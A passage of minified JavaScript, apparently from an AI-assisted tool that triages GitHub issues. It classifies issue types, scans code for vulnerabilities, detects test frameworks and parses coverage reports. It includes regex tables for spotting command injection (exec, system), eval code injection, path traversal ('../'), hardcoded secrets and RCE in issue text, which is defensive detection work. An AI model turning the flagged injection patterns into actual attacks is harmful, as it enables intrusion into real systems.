K=JSON.parse(X);if(K&&typeof K==="object")return{issueType:K.issueType||PU(Q),filesToModify:Array.isArray(K.filesToModify)?K.filesToModify:[],estimatedComplexity:K.estimatedComplexity||"medium",requiredContext:K.requiredContext||[],suggestedApproach:K.suggestedApproach||"",confidenceScore:K.confidenceScore||0.7,canBeFixed:K.canBeFixed!==void 0?K.canBeFixed:!0}}catch(K){V.debug("Response is not JSON, using text parsing")}let J=PU(Q),Y=[],W="medium",G=/`([\w\-./]+\.[\w]+)`|"([\w\-./]+\.[\w]+)"|'([\w\-./]+\.[\w]+)'|([\w\-./]*\/[\w\-./]*\.(?:js|ts|py|java|rb|php|go|rs|cpp|c|h))/g,H;while((H=G.exec(X))!==null){let K=H[1]||H[2]||H[3]||H[4];if(K&&!Y.includes(K))Y.push(K)}let $=["login.js","auth.js","login.ts","auth.ts","authentication.js","authentication.ts","security.js","security.ts"];for(let K of $)if(X.toLowerCase().includes(K.toLowerCase())&&!Y.includes(K))Y.push(K);if(X.toLowerCase().includes("simple")||X.toLowerCase().includes("straightforward"))W="simple";else if(X.toLowerCase().includes("complex")||X.toLowerCase().includes("challenging"))W="complex";let z="",U=["Suggested Approach:","Approach:","Solution:","Fix:","Recommendation:","To fix this"];for(let K of U)if(X.includes(K)){if(z=X.split(K)[1]?.split(`

`)[0]?.trim()||"",z)break}if(!z&&X.length>50)if(X.length>500)z=X.trim();else z=X.split(`

`).filter((B)=>B.trim().length>20)[0]?.trim()||"";return V.info(`Parsed analysis for issue #${Q.number}:`,{filesToModify:Y,suggestedApproach:z.substring(0,100),canBeFixed:Y.length>0&&z.length>0}),{issueType:J,filesToModify:Y,estimatedComplexity:W,requiredContext:[],suggestedApproach:z,confidenceScore:0.7,canBeFixed:(Y.length>0||z.length>50)&&z.length>0}}catch(J){return V.error("Error parsing AI analysis response",J),{issueType:"other",filesToModify:[],estimatedComplexity:"medium",requiredContext:[],suggestedApproach:"Unable to determine approach from AI analysis.",canBeFixed:!1}}}function Uu1(X){let Q=[],J=/####\s*`([^`]+)`/g,Y;while((Y=J.exec(X.body))!==null)Q.push(Y[1]);return Q}function PU(X){let Q=X.title.toLowerCase(),J=X.body.toLowerCase(),Y=`${Q} ${J}`;for(let W of X.labels){if(W.toLowerCase().includes("bug"))return"bug";if(W.toLowerCase().includes("feature"))return"feature";if(W.toLowerCase().includes("refactor"))return"refactoring";if(W.toLowerCase().includes("performance"))return"performance";if(W.toLowerCase().includes("security"))return"security";if(W.toLowerCase().includes("documentation"))return"documentation";if(W.toLowerCase().includes("dependency"))return"dependency";if(W.toLowerCase().includes("test"))return"test"}if(Y.includes("fix")||Y.includes("bug")||Y.includes("issue")||Y.includes("crash")||Y.includes("error"))return"bug";else if(Y.includes("add")||Y.includes("new")||Y.includes("feature")||Y.includes("implement"))return"feature";else if(Y.includes("refactor")||Y.includes("clean")||Y.includes("improve code"))return"refactoring";else if(Y.includes("performance")||Y.includes("slow")||Y.includes("optimize")||Y.includes("speed"))return"performance";else if(Y.includes("secur")||Y.includes("vulnerab")||Y.includes("hack")||Y.includes("attack"))return"security";else if(Y.includes("document")||Y.includes("readme")||Y.includes("wiki")||Y.includes("comment"))return"documentation";else if(Y.includes("dependency")||Y.includes("upgrade")||Y.includes("update")||Y.includes("package"))return"dependency";else if(Y.includes("test")||Y.includes("spec")||Y.includes("unit test")||Y.includes("coverage"))return"test";return"other"}var w5=$1(()=>{y1();N5()});var rD=$1(()=>{BQ();s7();VH();BQ();$X()});class MQ{securityDetector;constructor(){let X=L8();this.securityDetector=new U7(X)}async analyzeWithSecurity(X,Q,J,Y){V.info(`Analyzing issue #${X.number} with security-aware analysis`);let W=await this.performStandardAnalysis(X,Q,Y),G;if(J&&J.size>0){if(G=await this.performSecurityAnalysis(J,X),G.hasSecurityIssues)W.issueType="security",W.estimatedComplexity=this.adjustComplexityForSecurity(W.estimatedComplexity,G.riskLevel)}return{...W,securityAnalysis:G}}async performSecurityAnalysis(X,Q){V.info("=== SECURITY ANALYSIS v2.0 ACTIVE ==="),V.info(`Performing security analysis on ${X.size} codebase files`);let J=[],Y=[];for(let[$,z]of X.entries()){let U=this.getLanguageFromPath($);if(!U){V.debug(`Skipping file ${$} - unable to determine language`);continue}let K=await this.securityDetector.detect(z,U,$);if(K.length>0){let B=K.map((q)=>({...q,file:$}));J.push(...B),Y.push($),V.info(`Found ${K.length} vulnerabilities in ${$}`)}}let W=this.calculateRiskLevel(J),G=this.generateSecurityRecommendations(J),H={total:J.length,byType:{},bySeverity:{}};return J.forEach(($)=>{H.byType[$.type]=(H.byType[$.type]||0)+1,H.bySeverity[$.severity]=(H.bySeverity[$.severity]||0)+1}),{hasSecurityIssues:J.length>0,vulnerabilities:J,riskLevel:W,recommendations:G,affectedFiles:Y,summary:H}}getLanguageFromPath(X){switch(X.split(".").pop()?.toLowerCase()){case"js":case"jsx":return"javascript";case"ts":case"tsx":return"typescript";case"py":return"python";case"rb":return"ruby";case"php":return"php";case"java":return"java";case"rs":return"rust";case"ex":case"exs":return"elixir";default:return null}}calculateRiskLevel(X){if(X.length===0)return"low";let Q=X.filter((W)=>W.severity==="critical").length,J=X.filter((W)=>W.severity==="high").length,Y=X.filter((W)=>W.severity==="medium").length;if(Q>0)return"critical";if(J>=3)return"critical";if(J>=1)return"high";if(Y>=3)return"high";if(Y>=1)return"medium";return"low"}generateSecurityRecommendations(X){let Q=new Set;for(let J of X){if(J.remediation)Q.add(J.remediation);switch(J.type){case"sql_injection":Q.add("Implement parameterized queries throughout the codebase"),Q.add("Add input validation and sanitization");break;case"xss":Q.add("Use secure DOM manipulation methods (textContent, not innerHTML)"),Q.add("Implement Content Security Policy (CSP)");break;default:Q.add("Review security best practices for this vulnerability type")}}return Array.from(Q)}adjustComplexityForSecurity(X,Q){if(Q==="critical")return"complex";if(Q==="high"&&X==="simple")return"medium";if(Q==="high"&&X==="medium")return"complex";return X}async performStandardAnalysis(X,Q,J){let{analyzeIssue:Y}=await Promise.resolve().then(() => (w5(),iD));return await Y(X,Q,J)}determineIssueType(X){let Q=X.title.toLowerCase(),J=X.body.toLowerCase(),Y=`${Q} ${J}`;if(Y.includes("secur")||Y.includes("vulnerab")||Y.includes("hack")||Y.includes("attack")||Y.includes("xss")||Y.includes("sql injection"))return"security";if(Y.includes("fix")||Y.includes("bug"))return"bug";else if(Y.includes("add")||Y.includes("feature"))return"feature";else if(Y.includes("refactor"))return"refactoring";else if(Y.includes("performance"))return"performance";return"other"}}var SU=$1(()=>{y1();rD();BQ();s7()});import*as U6 from"fs";import*as I5 from"path";class EU{async detectFromPackageJson(X){if(!X)return{detected:!1,frameworks:[]};let Q=[],J={...X.dependencies,...X.devDependencies};for(let[Y,W]of Object.entries(Ku1))for(let G of W.patterns){let H=Object.keys(J).find(($)=>$.includes(G));if(H){let $=J[H],z=this.detectVersionType($),U={name:Y,version:$,type:W.type,confidence:1,detectionMethod:"package",versionType:z};if("companions"in W&&W.companions){let K=W.companions.filter((B)=>Object.keys(J).some((q)=>q.includes(B)));if(K.length>0)U.companions=K}Q.push(U);break}}return{detected:Q.length>0,frameworks:Q}}async detectFromRequirements(X){if(!X)return{detected:!1,frameworks:[]};let Q=[],J=X.split(`
`);for(let[Y,W]of Object.entries(Vu1))if("patterns"in W&&W.patterns)for(let G of W.patterns){let H=J.find(($)=>$.startsWith(G));if(H){let $=H.includes("==")?H.split("==")[1].trim():"unknown",z={name:Y,version:$,type:W.type,confidence:1,detectionMethod:"package"};if("plugins"in W&&W.plugins){let U=W.plugins.filter((K)=>J.some((B)=>B.startsWith(K)));if(U.length>0)z.plugins=U}Q.push(z);break}}return{detected:Q.length>0,frameworks:Q}}async detectFromGemfile(X){if(!X)return{detected:!1,frameworks:[]};let Q=[],J=X.split(`
`);for(let[Y,W]of Object.entries(Bu1))for(let G of W.patterns){let H=J.find(($)=>$.includes(`gem '${G}`)||$.includes(`gem "${G}`));if(H){let $=H.match(/['"]([^'"]+)['"]\s*,\s*['"]([^'"]+)['"]/),z=$?$[2]:"unknown",U={name:Y,version:z,type:W.type,confidence:1,detectionMethod:"package"};if("variants"in W&&W.variants){let K=W.variants.find((B)=>J.some((q)=>q.includes(`gem '${B}'`)||q.includes(`gem "${B}"`)));if(K)U.variant=K}Q.push(U);break}}return{detected:Q.length>0,frameworks:Q}}async detectFromSourceCode(X,Q){let J=[];if(Q==="python"){if(X.includes("import unittest")||X.includes("from unittest"))J.push({name:"unittest",version:"builtin",type:"unit",confidence:0.9,detectionMethod:"import"})}return{detected:J.length>0,frameworks:J}}async detectFromFilePatterns(X){let Q=[];if(X.some((W)=>W.includes(".test.")||W.includes(".spec.")||W.includes("__tests__")))Q.push({name:"jest",version:"unknown",type:"unit",confidence:0.7,detectionMethod:"file-pattern"});if(X.some((W)=>W.includes("_spec.rb")||W.includes("spec_helper.rb")||W.includes("/spec/")))Q.push({name:"rspec",version:"unknown",type:"unit",confidence:0.8,detectionMethod:"file-pattern"});return{detected:Q.length>0,frameworks:Q}}async detectFromConfigFiles(X){let Q=[];for(let J of X)if(J.includes("jest.config"))Q.push({name:"jest",version:"unknown",type:"unit",confidence:0.95,configFile:J,detectionMethod:"config"});else if(J.includes("vitest.config"))Q.push({name:"vitest",version:"unknown",type:"unit",confidence:0.95,configFile:J,detectionMethod:"config"});return{detected:Q.length>0,frameworks:Q}}async detectFrameworks(X){let Q=[],J=[],Y=[];try{let G=I5.join(X,"package.json");if(U6.existsSync(G)){let K=JSON.parse(U6.readFileSync(G,"utf-8")),B=await this.detectFromPackageJson(K);Q.push(...B.frameworks)}let H=I5.join(X,"requirements.txt");if(U6.existsSync(H)){let K=U6.readFileSync(H,"utf-8"),B=await this.detectFromRequirements(K);Q.push(...B.frameworks)}let $=I5.join(X,"Gemfile");if(U6.existsSync($)){let K=U6.readFileSync($,"utf-8"),B=await this.detectFromGemfile(K);Q.push(...B.frameworks)}let z=["test","tests","__tests__","spec","specs"];for(let K of z){let B=I5.join(X,K);if(U6.existsSync(B)&&U6.statSync(B).isDirectory())Y.push(K)}J.push("*.test.js","*.test.ts","*.spec.js","*.spec.ts","*_test.py","test_*.py","*_spec.rb","*.test.go");let U=I5.join(X,"bunfig.toml");if(U6.existsSync(U))Q.push({name:"bun",version:"builtin",type:"unit",confidence:1,detectionMethod:"config",configFile:"bunfig.toml"})}catch(G){}let W=Q.reduce((G,H)=>!G||H.confidence>G.confidence?H:G,null)||void 0;return{detected:Q.length>0,primaryFramework:W,allFrameworks:Q,testFilePatterns:J,testDirectories:Y}}detectVersionType(X){if(X.startsWith("^"))return"caret";if(X.startsWith("~"))return"tilde";if(X.includes(">")||X.includes("<")||X.includes(" "))return"range";return"exact"}}var Ku1,Vu1,Bu1;var nD=$1(()=>{Ku1={jest:{type:"unit",patterns:["jest"]},vitest:{type:"unit",patterns:["vitest","@vitest/"]},mocha:{type:"unit",patterns:["mocha"],companions:["chai","sinon"]},jasmine:{type:"unit",patterns:["jasmine"]},cypress:{type:"e2e",patterns:["cypress"]},playwright:{type:"e2e",patterns:["@playwright/test","playwright"]},ava:{type:"unit",patterns:["ava"]},tape:{type:"unit",patterns:["tape"]},qunit:{type:"unit",patterns:["qunit"]},bun:{type:"unit",patterns:["bun:test"]},karma:{type:"unit",patterns:["karma"]},"testing-library":{type:"unit",patterns:["@testing-library/"]}},Vu1={pytest:{type:"unit",patterns:["pytest"],plugins:["pytest-cov","pytest-mock"]},unittest:{type:"unit",builtin:!0},nose2:{type:"unit",patterns:["nose2"]},doctest:{type:"unit",builtin:!0},hypothesis:{type:"unit",patterns:["hypothesis"]}},Bu1={rspec:{type:"unit",patterns:["rspec"],variants:["rspec-rails"]},minitest:{type:"unit",patterns:["minitest"]},"test-unit":{type:"unit",patterns:["test-unit"]},cucumber:{type:"bdd",patterns:["cucumber"]},capybara:{type:"e2e",patterns:["capybara"]}}});class TU{async parseLcov(X){try{let Q=[],J=X.split("end_of_record").filter((W)=>W.trim());for(let W of J){let G=W.split(`
`).filter(($)=>$.trim()),H={functions:{total:0,covered:0,details:[]},lines:{total:0,covered:0,percentage:0,details:[]}};for(let $ of G){let[z,...U]=$.split(":"),K=U.join(":");switch(z){case"SF":H.path=K;break;case"FN":let[B,q]=K.split(",");H.functions.details.push({name:q,line:parseInt(B),hits:0});break;case"FNF":H.functions.total=parseInt(K);break;case"FNH":H.functions.covered=parseInt(K);break;case"DA":let[Z,M]=K.split(","),L=parseInt(Z),R=parseInt(M);if(H.lines.details.push({line:L,hits:R}),R===0&&!H.lines.uncoveredLines)H.lines.uncoveredLines=[];if(R===0)H.lines.uncoveredLines.push(L);break;case"LF":H.lines.total=parseInt(K);break;case"LH":H.lines.covered=parseInt(K);break}}if(H.lines.total>0)H.lines.percentage=parseFloat((H.lines.covered/H.lines.total*100).toFixed(2));if(H.functions?.details){for(let $ of H.functions.details){let z=H.lines.details.find((U)=>U.line===$.line);if(z)$.hits=z.hits}if(H.functions.total>0)H.functions.percentage=parseFloat((H.functions.covered/H.functions.total*100).toFixed(2))}if(H.path)Q.push(H)}let Y=this.calculateSummary(Q);return{format:"lcov",files:Q,summary:Y}}catch(Q){return{format:"lcov",files:[],error:`Failed to parse LCOV data: ${Q}`,summary:{totalFiles:0,totalLines:0,coveredLines:0,linePercentage:0}}}}async parseCoveragePy(X){try{let Q=JSON.parse(X),J=[];for(let[Y,W]of Object.entries(Q.files)){let G=W;J.push({path:Y,lines:{total:G.summary.num_statements,covered:G.summary.covered_lines,percentage:G.summary.percent_covered,uncoveredLines:G.missing_lines}})}return{format:"coverage.py",files:J,summary:{totalFiles:J.length,totalLines:Q.totals.num_statements,coveredLines:Q.totals.covered_lines,linePercentage:Q.totals.percent_covered}}}catch(Q){return{format:"coverage.py",files:[],error:`Failed to parse coverage.py data: ${Q}`}}}async parseCoveragePyXml(X){try{let Q=[],J=X.matchAll(/<class filename="([^"]+)"[^>]*>([\s\S]*?)<\/class>/g);for(let Y of J){let W=Y[1],H=Y[2].matchAll(/<line number="(\d+)" hits="(\d+)"/g),$=[],z=[];for(let B of H){let q=parseInt(B[1]),Z=parseInt(B[2]);if($.push({line:q,hits:Z}),Z===0)z.push(q)}let U=$.filter((B)=>B.hits>0).length,K=$.length;Q.push({path:W,lines:{total:K,covered:U,percentage:K>0?parseFloat((U/K*100).toFixed(2)):0,details:$,uncoveredLines:z}})}return{format:"coverage.py-xml",files:Q,summary:this.calculateSummary(Q)}}catch(Q){return{format:"coverage.py-xml",files:[],error:`Failed to parse coverage.py XML: ${Q}`}}}async parseSimpleCov(X){try{let Q=JSON.parse(X),J=[],W=Object.values(Q)[0].coverage;if(!W)throw Error("Invalid SimpleCov format: missing coverage data");for(let[G,H]of Object.entries(W)){let $=H,z=$.lines||$,K=(Array.isArray(z)?z:[]).map((Z,M)=>({line:M+1,hits:Z})).filter((Z)=>Z.hits!==null),B=K.filter((Z)=>Z.hits>0),q=K.filter((Z)=>Z.hits===0).map((Z)=>Z.line);J.push({path:G,lines:{total:K.length,covered:B.length,percentage:K.length>0?parseFloat((B.length/K.length*100).toFixed(2)):0,uncoveredLines:q}})}return{format:"simplecov",files:J,summary:this.calculateSummary(J)}}catch(Q){return{format:"simplecov",files:[],error:`Failed to parse SimpleCov data: ${Q}`}}}async findCoverageGaps(X){let Q=[];for(let J of X.files){if(J.functions?.details){for(let Y of J.functions.details)if(Y.hits===0)Q.push({file:J.path,type:"uncovered-function",name:Y.name,line:Y.line,priority:this.getPriority(J.path,"function")})}if(J.lines.uncoveredLines&&J.lines.uncoveredLines.length>0){let Y=this.findUncoveredBlocks(J.lines.uncoveredLines);for(let W of Y)Q.push({file:J.path,type:"uncovered-block",lines:W,priority:this.getPriority(J.path,"block",W.length)});if(J.lines.uncoveredLines.length>=5&&this.isSecurityFile(J.path))Q.push({file:J.path,type:"uncovered-block",lines:J.lines.uncoveredLines.slice(0,5),priority:"critical"})}if(J.lines.percentage<50)Q.push({file:J.path,type:"low-coverage",coveragePercentage:J.lines.percentage,priority:this.getPriority(J.path,"file",void 0,J.lines.percentage)})}return Q}async findTestsForFile(X,Q){let J=this.getBaseName(X),Y=Q.filter((W)=>{return this.getBaseName(W).includes(J)||W.includes(X.replace(/\.[^.]+$/,""))});return{sourceFile:X,testFiles:Y,hasTests:Y.length>0}}async mapTestsToSource(X,Q){let J={};for(let Y of X)J[Y]=await this.findTestsForFile(Y,Q);return J}async generateSummary(X){let Q=X.files.filter((Y)=>Y.lines.percentage<80).map((Y)=>Y.path),J=X.files.filter((Y)=>Y.lines.percentage>=80).map((Y)=>Y.path);return{overallCoverage:X.summary?.linePercentage||0,filesCovered:X.files.length,linesOfCode:X.summary?.totalLines||0,linesCovered:X.summary?.coveredLines||0,functionsCovered:X.summary?.coveredFunctions,totalFunctions:X.summary?.totalFunctions,needsImprovement:Q,wellCovered:J}}async recommendTestPriorities(X){let Q=[],J=[...X].sort((W,G)=>{let H={critical:0,high:1,medium:2,low:3};return H[W.priority]-H[G.priority]}),Y=1;for(let W of J){let G=this.getRecommendationReason(W),H=this.getSuggestedTests(W);Q.push({priority:Y++,file:W.file,reason:G,suggestedTests:H,coverageGap:W})}return Q}async getTestGenerationContext(X,Q){let J=X.files.find((G)=>G.path===Q);if(!J)throw Error(`File ${Q} not found in coverage report`);let Y=J.functions?.details?.filter((G)=>G.hits===0).map((G)=>G.name)||[],W=this.getPriority(Q,"file",void 0,J.lines.percentage);return{file:Q,uncoveredFunctions:Y,uncoveredLines:J.lines.uncoveredLines||[],coveragePercentage:J.lines.percentage,priority:W,suggestedTestTypes:this.getSuggestedTestTypes(J,W)}}calculateSummary(X){let Q=0,J=0,Y=0,W=0;for(let G of X)if(Q+=G.lines.total,J+=G.lines.covered,G.functions)Y+=G.functions.total,W+=G.functions.covered;return{totalFiles:X.length,totalLines:Q,coveredLines:J,linePercentage:Q>0?parseFloat((J/Q*100).toFixed(2)):0,totalFunctions:Y||void 0,coveredFunctions:W||void 0,functionPercentage:Y>0?parseFloat((W/Y*100).toFixed(2)):void 0}}findUncoveredBlocks(X){if(X.length===0)return[];let Q=[],J=[X[0]];for(let Y=1;Y<X.length;Y++)if(X[Y]===X[Y-1]+1)J.push(X[Y]);else{if(J.length>=1)Q.push([...J]);J=[X[Y]]}if(J.length>=1)Q.push(J);return Q}getPriority(X,Q,J,Y){if(this.isSecurityFile(X)){if(Q==="file")return"critical";if(Q==="function"&&Y===0)return"critical";return Q==="function"||Q==="block"&&J&&J>=3?"critical":"high"}if(Q==="function")return"high";if(Q==="block"&&J&&J>10)return"high";if(Q==="file"&&Y!==void 0&&Y<30)return"high";return"medium"}isSecurityFile(X){return["auth","crypto","security","password","token","session","validat"].some((J)=>X.toLowerCase().includes(J))}getBaseName(X){let Q=X.split("/");return Q[Q.length-1].replace(/\.(test|spec|tests?)\..*$/,"").replace(/\.[^.]+$/,"")}getRecommendationReason(X){switch(X.type){case"uncovered-function":return X.priority==="critical"?"Critical security function lacks coverage":`Function ${X.name} has no test coverage`;case"uncovered-block":return`Code block (${X.lines?.length} lines) lacks coverage`;case"low-coverage":return`File has only ${X.coveragePercentage}% coverage`;default:return"Insufficient test coverage"}}getSuggestedTests(X){let Q=[];switch(X.type){case"uncovered-function":if(Q.push("Unit test for function behavior"),Q.push("Edge case tests"),X.priority==="critical")Q.push("Security validation tests"),Q.push("Error handling tests");break;case"uncovered-block":Q.push("Branch coverage tests"),Q.push("Conditional logic tests");break;case"low-coverage":Q.push("Comprehensive unit tests"),Q.push("Integration tests");break}return Q}getSuggestedTestTypes(X,Q){let J=["unit"];if(X.path.includes("valid"))J.push("validation","edge-cases");if(Q==="critical")J.push("security","error-handling");if(X.lines.percentage===0)J.unshift("basic-functionality");return J}}class _U{vulnerabilityPatterns={"sql-injection":[/sql\s*injection/i,/sqli\b/i,/concatenat\w*\s+.*\s*(sql|query)/i,/string\s+concatenation.*query/i,/unsanitized.*sql/i,/parameterized\s+quer/i],xss:[/cross[\s-]*site[\s-]*scripting/i,/\bxss\b/i,/unescaped\s+(html|user|data|input)/i,/html\s+entit/i,/script\s+injection/i,/<%=.*%>/],"path-traversal":[/path\s+traversal/i,/directory\s+traversal/i,/\.\.\/|\.\.\\+/g,/file\s+path.*validation/i],"command-injection":[/command\s+injection/i,/shell\s+injection/i,/os\s+command/i,/exec\(/i,/system\(/i],"code-injection":[/code\s*injection/i,/\beval\s*\(/i,/eval\(\s*(req\.|request\.|user|input)/i,/dynamic\s+code\s+execution/i,/CWE-94/i],"hardcoded-secrets":[/hardcoded\s*(secret|credential|password|key|token)/i,/CWE-798/i,/hardcoded\s+api\s*key/i],"open-redirect":[/open\s+redirect/i,/CWE-601/i,/unvalidated\s+redirect/i],"information-disclosure":[/information\s+disclosure/i,/timing\s+(attack|side.channel)/i,/CWE-208/i],injection:[/injection/i,/A03:2021/],rce:[/remote\s+code\s+execution/i,/\brce\b/i,/arbitrary\s+code/i]};severityIndicators={critical:[/critical/i,/severe/i,/emergency/i,/immediate/i,/cvss.*[89]\.\d/i,/remote\s+code\s+execution/i],high:[/high/i,/important/i,/major/i,/urgent/i,/cvss.*[67]\.\d/i],medium:[/medium/i,/moderate/i,/cvss.*[45]\.\d/i],low:[/low/i,/minor/i,/informational/i,/cvss.*[0-3]\.\d/i]};testFrameworkPatterns={jest:/\bjest\b/i,mocha:/\bmocha\b/i,jasmine:/\bjasmine\b/i,cypress:/\bcypress\b/i,playwright:/\bplaywright\b/i,vitest:/\bvitest\b/i,pytest:/\bpytest\b/i,unittest:/\bunittest\b/i,rspec:/\brspec\b/i,minitest:/\bminitest\b/i,phpunit:/\bphpunit\b/i,junit:/\bjunit\b/i,exunit:/\bexunit\b/i};async interpretIssue(X){let Q=await this.interpret(X.body),J=this.extractFromTitle(X.title);if(J.vulnerabilityType&&!Q.vulnerabilityType)Q.vulnerabilityType=J.vulnerabilityType;if(J.severity)Q.severity=J.severity;if(X.labels)for(let Y of X.labels){if(Y.toLowerCase()==="security")Q.category="security",Q.isSecurityIssue=!0;if(this.severityIndicators.critical.some((W)=>W.test(Y)))Q.severity="critical";if(Y.includes("sql-injection"))Q.vulnerabilityType="sql-injection",Q.confidence=Math.max(Q.confidence,0.95)}return Q}async interpret(X){if(!X||X.trim()==="")return this.createEmptyResult();let Q={vulnerabilityType:"unknown",confidence:0,affectedFiles:[],affectedFunctions:[],affectedLines:[],affectedLocations:[],keywords:[],codeSnippets:[],testFrameworks:[],testFiles:[],fixSuggestions:[]},J=this.checkIfSecurityIssue(X);Q.isSecurityIssue=J.isSecurity,Q.issueType=J.issueType;let Y=this.extractVulnerabilityType(X);Q.vulnerabilityType=Y.type,Q.confidence=Y.confidence,Q.keywords=Y.keywords,Q.multipleVulnerabilities=Y.multiple,Q.severity=this.extractSeverity(X),Q.urgency=this.mapSeverityToUrgency(Q.severity);let W=this.extractAffectedLocations(X);Q.affectedFiles=W.files,Q.affectedFunctions=W.functions,Q.affectedLines=W.lines,Q.affectedLocations=W.locations,Q.codeSnippets=this.extractCodeSnippets(X);let G=this.extractFunctionsFromCode(Q.codeSnippets);Q.affectedFunctions=[...new Set([...Q.affectedFunctions,...G])];let H=this.extractTestInformation(X);Q.testFrameworks=H.frameworks,Q.testFiles=H.files,Q.suggestedTestStrategy=H.strategy;let $=this.extractFixInformation(X);Q.fixSuggestions=$.suggestions,Q.fixExample=$.example,Q.suggestedPatterns=this.suggestPatterns(Q.vulnerabilityType,X);let z=this.extractMetadata(X);return Object.assign(Q,z),Q.references=this.extractReferences(X),Q.todoItems=this.extractTodoItems(X),Q}createEmptyResult(){return{vulnerabilityType:"unknown",confidence:0,needsMoreInfo:!0,affectedFiles:[],affectedFunctions:[],affectedLines:[],affectedLocations:[],keywords:[],codeSnippets:[],testFrameworks:[],testFiles:[],fixSuggestions:[]}}checkIfSecurityIssue(X){let Q=X.toLowerCase();if(Q.includes("feature request")||Q.includes("enhancement"))return{isSecurity:!1,issueType:"feature-request"};if(Q.includes("documentation")||Q.includes("docs"))return{isSecurity:!1,issueType:"documentation"};let Y=["security","vulnerability","exploit","injection","xss","csrf","authentication","authorization","encryption","attack","malicious","cve-","cwe-","owasp","sensitive","logs","debug"].some((W)=>Q.includes(W));return{isSecurity:Y,issueType:Y?"security":"other"}}extractVulnerabilityType(X){let Q=[];for(let[Y,W]of Object.entries(this.vulnerabilityPatterns)){let G=0,H=[];for(let $ of W){let z=X.match($);if(z)G++,H.push(z[0])}if(G>0)Q.push({type:Y,confidence:Math.min(0.5+G*0.25,1),keywords:H})}if(X.match(/multiple\s+(security\s+)?issues/i)){let Y=this.extractMultipleVulnerabilities(X);if(Y.length>1)return{type:"multiple",confidence:0.9,keywords:Q.flatMap((W)=>W.keywords),multiple:Y}}if(Q.length>0)return Q.sort((Y,W)=>W.confidence-Y.confidence),Q[0];return{type:"unknown",confidence:0,keywords:[]}}extractMultipleVulnerabilities(X){let Q=[],J=X.split(/\d+\./g).slice(1);for(let Y of J){let W=Y.trim().split(`
`).filter((B)=>B.trim());if(W.length===0)continue;let G=W[0],H=G.match(/(.+?)\s+in\s+(.+)/),$="",z="";if(H)$=this.normalizeVulnerabilityType(H[1]),z=H[2].trim();else $=this.normalizeVulnerabilityType(G);let U=z,K="";for(let B of W.slice(1)){let q=B.trim();if(q.includes("File:"))U=q.replace(/^-\s*File:\s*/,"").trim();else if(q.startsWith("-")&&!q.includes("File:"))K=q.replace(/^-\s*/,"").trim()}Q.push({type:$,file:U||void 0,description:K||void 0})}return Q}normalizeVulnerabilityType(X){let Q=X.toLowerCase().trim();if(Q.includes("sql injection"))return"sql-injection";if(Q.includes("xss")||Q.includes("cross-site scripting"))return"xss";if(Q.includes("path traversal"))return"path-traversal";if(Q.includes("command injection"))return"command-injection";return Q.replace(/\s+/g,"-")}extractSeverity(X){let Q=X.match(/cvss\s*(?:score)?[:\s]+(\d+\.?\d*)/i);if(Q){let J=parseFloat(Q[1]);if(J>=9)return"critical";if(J>=7)return"high";if(J>=4)return"medium";return"low"}for(let[J,Y]of Object.entries(this.severityIndicators))if(Y.some((W)=>W.test(X)))return J;return}mapSeverityToUrgency(X){switch(X){case"critical":return"immediate";case"high":return"urgent";case"medium":return"planned";case"low":return"planned";case"info":return"backlog";default:return}}extractAffectedLocations(X){let Q=[],J=[],Y=[],W=[],G=X.split(`
`);for(let U of G){if(!U.trim())continue;let K=U.match(/^\s*-\s+([^\s(]+\.[a-zA-Z]+)\s*\(line\s+(\d+)\s*-\s*(\d+)\s*\)/i);if(K){let F=K[1];if(!Q.includes(F)){Q.push(F);let A={file:F,lines:[]},O=parseInt(K[2]),w=parseInt(K[3]);for(let N=O;N<=w;N++)A.lines.push(N);W.push(A)}continue}let B=U.match(/^\s*-\s+([^\s:]+\.[a-zA-Z]+):(\d+)/i);if(B){let F=B[1];if(!Q.includes(F))Q.push(F),W.push({file:F,lines:[parseInt(B[2])]});continue}let q=U.match(/(?:\*\*File\*\*|\bFile):\s*([^\s,]+\.[a-zA-Z]+)(?:,?\s*(?:\*\*Function\*\*|Function):\s*(\w+))?/i);if(q){let F=q[1];if(!Q.includes(F)){Q.push(F);let A={file:F};if(q[2])A.function=q[2];W.push(A)}continue}let Z=U.match(/^\s*-\s*`([^`]+\.[a-zA-Z]+)`\s*-\s*(\w+)\s+function/i);if(Z){let F=Z[1];if(!Q.includes(F))Q.push(F),W.push({file:F,function:Z[2]});continue}let M=U.match(/^\s*-\s+([^\s]+\.[a-zA-Z]+)\s*$/i);if(M){let F=M[1];if(!Q.includes(F))Q.push(F),W.push({file:F});continue}let L=U.match(/\*\*([^\*]+\.[a-zA-Z]+)\*\*/i);if(L){let F=L[1];if(!Q.includes(F))Q.push(F),W.push({file:F})}let R=U.match(/^\s*-\s*\*\*Function\*\*:\s*(\w+)\s*\(lines?\s+(\d+)\s*-\s*(\d+)\s*\)/i);if(R&&W.length>0){let F=W[W.length-1];F.function=R[1],F.lines=[];let A=parseInt(R[2]),O=parseInt(R[3]);for(let w=A;w<=O;w++)F.lines.push(w);if(!J.includes(R[1]))J.push(R[1])}let j=U.match(/^\s*-\s*\*\*Endpoint\*\*:\s*(.+)$/i);if(j&&W.length>0){let F=W[W.length-1];F.endpoint=j[1].trim()}}let H=[/\bline[s]?[:\s]+(\d+)(?:\s*-\s*(\d+))?/gi,/:(\d+)\b/g,/\(line[s]?\s+(\d+)(?:\s*-\s*(\d+))?\)/gi];for(let U of H){let K;while((K=U.exec(X))!==null){let B=parseInt(K[1]);if(!Y.includes(B))Y.push(B);if(K[2]){let q=parseInt(K[2]);for(let Z=B+1;Z<=q;Z++)if(!Y.includes(Z))Y.push(Z)}}}let $=[/(?:Function|function):\s*(\w+)/g,/\bfunction\s+(\w+)/g,/\bdef\s+(\w+)/g,/`(\w+)\(\)`/g,/\bThe\s+`(\w+)\(\)`\s+function/gi];for(let U of $){let K;while((K=U.exec(X))!==null){let B=K[1];if(!J.includes(B)&&B.length>2&&!this.isCommonWord(B))J.push(B)}}let z=X.match(/(?:endpoint|route|api):\s*([^\n]+)/i);if(z&&W.length>0)W[0].endpoint=z[1].trim();return{files:[...new Set(Q)],functions:[...new Set(J)],lines:[...new Set(Y)].sort((U,K)=>U-K),locations:W}}isCommonWord(X){return["the","and","for","with","from","this","that","where","when"].includes(X.toLowerCase())}extractCodeSnippets(X){let Q=[],J=/```(\w+)?\n([\s\S]*?)```/g,Y;while((Y=J.exec(X))!==null){let W=Y[1]||"unknown",G=Y[2].trim();Q.push({language:W,code:G,vulnerableLines:this.identifyVulnerableLines(G,W)})}return Q}identifyVulnerableLines(X,Q){let J=[];return X.split(`
